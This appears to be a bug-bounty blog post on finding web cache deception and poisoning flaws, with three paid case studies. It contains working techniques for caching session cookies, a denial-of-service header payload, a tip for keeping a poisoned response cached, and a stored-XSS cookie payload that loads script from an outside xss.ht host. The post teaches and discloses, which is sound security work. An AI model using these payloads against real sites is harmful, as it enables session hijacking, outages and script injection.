https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9

![img.png](img.png)

I will be sharing my “Methodology” from start to end when looking for Cache Issues, then I will share recent Real-Cases Scenarios with their respective Bounties.

It is worth sharing that I don’t use Automated tools to find these issues. In fact the Only Automated Tool I use for my general testing is SQLmap for SQLi.


Methodology

>If the application does not have a login functionality, but using Akamai CDN, these are my steps:

- Send the first request to Repeater

![img_1.png](img_1.png)

- Check if the server is caching normal requests (you can tell this by the response header “Server-Timing: cdn-cache; desc=HIT”)

![img_2.png](img_2.png)

- Add an Illegal Request Header into the request

![img_3.png](img_3.png)

- If the response was successfully cached, when you open the URL on any browser, you should get a 400 Bad Request

![img_4.png](img_4.png)


>If the Application does have a Login Functionality

- Create an account
- Check if any sensitive information is disclosed in any page (e.g Session Token)

![img_5.png](img_5.png)

- Send the request to Repeater
- Add a Cacheable Extension (.js , .css) at the end of the URL and see if it gives a 200 OK Response


![img_6.png](img_6.png)


- Open the Modified URL using your authenticated Account


![img_7.png](img_7.png)

- Open the Same URL using curl or Private Web Browser Window

![img_8.png](img_8.png)

- If the Token was successfully Cached you should see the Token in the response
![img_9.png](img_9.png)


>If the Application is using Cloudflare CDN


Illegal headers won’t work, and now most Cloudflare Customers are using [Cache Deception Armor](https://developers.cloudflare.com/cache/about/cache-deception-armor/)

I was able to bypass this protection using .avif file which is a really unknown extension file.


https://hackerone.com/reports/1391635


However, there are some sites that don’t have this protection activated and you can perfectly test for Cache Poisoning/Deception


>Cache Deception To Account Takeover → Bounty = $1,500


## Summary:
All cookies (even HTTPonly ones) are being disclosed in `https://host.com/app/conversation/1.js`

if an authenticated user visits this URL all their cookies will be stored in the cache

An attacker can then extract the cookie and hijack their Session

- Note:

Sometimes, if the response is a “404 Not found” Akamai only caches the response for less than 10 seconds, making this harder for the attacker. The attacker needs to be quick in this case, however, if Akamai Detects a 200 Ok Response, the response will last for at least 24 Hours.

- Tip & Trick

In some Applications, if you add a Semicolon (;) before the extension it may give you a 200 Ok response

e.g

`/xxxx/xxxxxx/;.js`

Response

`HTTP/2 200 Ok`

>Cache Poisoning To DoS → Bounty = $1,000

## Summary:
In Akamai CDN, If we send a backslash \ as a header, the server will respond with a 400 Bad Request Response

Request:

```
GET /products/xxx/xxxx/xxx/?test HTTP/2
Host: www.host.com
\:
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers
```

Response:
```
HTTP/2 400 Bad Request
Content-Type: text/html;charset=iso-8859-1
Content-Length: 70
Cache-Control: max-age=297
Expires: Thu, 21 Jul 2022 16:17:54 GMT
Date: Thu, 21 Jul 2022 16:12:57 GMT
Server-Timing: cdn-cache; desc=HIT
Server-Timing: edge; dur=32
Server-Timing: origin; dur=147
Strict-Transport-Security: max-age=86400
Ak-Uuid: 0.bc85d817.1658419977.1592c61
```

This becomes an issue when the site uses caching servers. Sites typically only caches javascript, css and other files, but when sites like www.host.com also caches normal responses like

`www.host.com/products/*`

`www.host.com/*`

etc..

It becomes a very impactful bug.

- Tip & Trick
Akamai has a workaround for this exploit, by making the 400 response to only last 5 seconds in the cache, however, an attacker can send null payloads using intruder in burp, so that the same 400 response gets cached forever

![img_10.png](img_10.png)

> Cache Poisoning To Stored XSS → Bounty = $1,000


## Summary:

There is a XSS via then_vis Cookie Parameter

Since the server caches this response, an attacker could be able to save a XSS Payload

There is a strong Filter (and WAF) that blocks most payloads, but since the site is using Jquery, an attacker can use the $.getScript Function to exploit this.


Request

```
GET /xxxx/xx-xx.otf?triagethiss HTTP/2
Host: www.host.com
Cookie: n_vis=xssx'*$.getScript`//593.xss.ht`//;
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-xss,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Te: trailers

```

Response


```js
<script>
...
Visitor.id='xssx'*$.getScript`//593.xss.ht`//;
....
</script>

```
- Tip & Trick

Test for XSS on any Request Header, Cookies, Custom Headers, X-Forwared-* Headers